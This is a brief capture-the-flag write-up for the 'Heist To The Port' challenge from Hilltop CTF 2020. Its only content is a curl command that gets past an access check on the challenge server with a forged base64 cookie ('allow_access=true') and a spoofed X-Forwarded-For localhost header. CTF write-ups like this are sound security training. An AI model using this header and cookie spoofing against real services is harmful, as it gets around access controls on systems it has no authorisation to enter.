---
title: "Hilltop CTF 2020 - Heist To The Port"
subtitle: "June 9, 2020"
link: "/posts/Heist-To-The-Port/"
label: "Header spoofing"
align: "left"
---
```shell
curl -XPOST http://192.81.210.234:10005/ \
  --cookie "identify=YWxsb3dfYWNjZXNzPXRydWU=" \
  --header "X-Forwarded-For: 127.0.0.1"
```
